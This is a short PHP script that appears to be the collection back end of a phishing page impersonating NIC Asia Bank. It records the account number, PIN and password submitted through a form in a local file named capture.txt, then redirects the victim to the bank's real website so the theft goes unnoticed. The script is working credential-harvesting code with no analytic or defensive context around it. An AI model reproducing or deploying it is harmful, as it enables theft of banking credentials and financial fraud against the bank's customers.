<?php
file_put_contents("capture.txt", "[NUMBER]: " . $_POST['number'] . " [PIN]: " . $_POST['pin'] . " [PASSWORD]: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.nicasiabank.com/');
exit();
